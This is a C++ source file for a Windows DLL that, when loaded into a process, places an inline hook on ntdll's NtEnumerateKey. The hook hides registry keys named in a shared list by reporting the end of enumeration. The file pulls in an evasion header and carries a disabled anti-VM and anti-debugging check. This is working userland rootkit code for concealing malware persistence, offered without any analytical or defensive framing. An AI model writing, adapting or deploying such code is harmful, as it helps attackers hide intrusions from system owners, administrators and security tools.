#include <windows.h>
#include <winternl.h>
#include <string>
#include <vector>
#include <algorithm>
#include "../../include/IPCObjects_File.h"
#include "../../include/InlineHook.h"
#include "../../include/Evasion.h"

using namespace std;

#define STATUS_NO_MORE_ENTRIES ((NTSTATUS)0x8000001AL)

typedef enum _KEY_INFORMATION_CLASS
{
    KeyBasicInformation = 0,
    KeyNodeInformation = 1,
    KeyFullInformation = 2,
    KeyNameInformation = 3,
} KEY_INFORMATION_CLASS;

typedef enum _KEY_VALUE_INFORMATION_CLASS
{
    KeyValueBasicInformation = 0,
    KeyValueFullInformation = 1,
    KeyValuePartialInformation = 2,
} KEY_VALUE_INFORMATION_CLASS;

typedef struct _KEY_BASIC_INFORMATION
{
    LARGE_INTEGER LastWriteTime;
    ULONG TitleIndex;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef struct _KEY_NAME_INFORMATION
{
    ULONG NameLength;
    WCHAR Name[1];
} KEY_NAME_INFORMATION, *PKEY_NAME_INFORMATION;

typedef struct _KEY_VALUE_BASIC_INFORMATION
{
    ULONG TitleIndex;
    ULONG Type;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_VALUE_BASIC_INFORMATION, *PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION
{
    ULONG TitleIndex;
    ULONG Type;
    ULONG DataOffset;
    ULONG DataLength;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;

typedef NTSTATUS(NTAPI *NtEnumerateKey_t)(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength);

HookContext g_hookContext = {0};
NtEnumerateKey_t pOriginalFunc = NULL;

NTSTATUS NTAPI HookedNtEnumerateKey(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength)
{
    // Call original function via trampoline
    if (!pOriginalFunc)
    {
        return STATUS_NO_MORE_ENTRIES;
    }

    NTSTATUS status = pOriginalFunc(
        KeyHandle, Index, KeyInformationClass,
        KeyInformation, Length, ResultLength);

    if (!NT_SUCCESS(status))
    {
        return status;
    }

    // Load the list of keys to hide
    vector<wstring> hiddenKeys;
    try
    {
        hiddenKeys = deserializeWStringVector(L"registryMapped");
    }
    catch (...)
    {
        return status;
    }

    if (hiddenKeys.empty())
    {
        return status;
    }

    // Get the key name
    wstring keyName;
    if (KeyInformationClass == KeyBasicInformation && KeyInformation)
    {
        PKEY_BASIC_INFORMATION basicInfo = (PKEY_BASIC_INFORMATION)KeyInformation;
        if (basicInfo->NameLength > 0)
        {
            keyName = wstring(basicInfo->Name, basicInfo->NameLength / sizeof(WCHAR));
        }
    }
    else if (KeyInformationClass == KeyNameInformation && KeyInformation)
    {
        PKEY_NAME_INFORMATION nameInfo = (PKEY_NAME_INFORMATION)KeyInformation;
        if (nameInfo->NameLength > 0)
        {
            keyName = wstring(nameInfo->Name, nameInfo->NameLength / sizeof(WCHAR));
        }
    }

    if (keyName.empty())
    {
        return status;
    }

    // Convert to lowercase for case-insensitive comparison
    transform(keyName.begin(), keyName.end(), keyName.begin(), ::towlower);

    // Check if key should be hidden
    for (const auto &hiddenKey : hiddenKeys)
    {
        wstring hiddenLower = hiddenKey;
        transform(hiddenLower.begin(), hiddenLower.end(), hiddenLower.begin(), ::towlower);

        if (keyName.find(hiddenLower) != wstring::npos || hiddenLower.find(keyName) != wstring::npos)
        {
            // Key hidden - return "end of list"
            return STATUS_NO_MORE_ENTRIES;
        }
    }

    return status;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{

    switch (dwReason)
    {

    case DLL_PROCESS_ATTACH:
    {
        // Anti-VM and anti-debugging check (disabled in DLL context)
        // if (!isSafeEnvironment()) {
        //     return FALSE;
        // }

        DisableThreadLibraryCalls(hModule);

        // Get the address of NtEnumerateKey
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll)
        {
            OutputDebugStringW(L"[registryHooks] Failed to get ntdll.dll");
            return FALSE;
        }

        PVOID pNtEK = (PVOID)GetProcAddress(hNtdll, "NtEnumerateKey");
        if (!pNtEK)
        {
            OutputDebugStringW(L"[registryHooks] Failed to get NtEnumerateKey");
            return FALSE;
        }

        // Install the inline hook
        if (InstallInlineHook(pNtEK, (PVOID)HookedNtEnumerateKey, &g_hookContext))
        {
            pOriginalFunc = (NtEnumerateKey_t)g_hookContext.trampoline;
            OutputDebugStringW(L"[registryHooks] Inline Hook installed successfully");
        }
        else
        {
            OutputDebugStringW(L"[registryHooks] Failed to install inline hook");
            return FALSE;
        }
    }
    break;

    case DLL_PROCESS_DETACH:
        // Remove the hook
        UninstallInlineHook(&g_hookContext);
        break;
    }

    return TRUE;
}
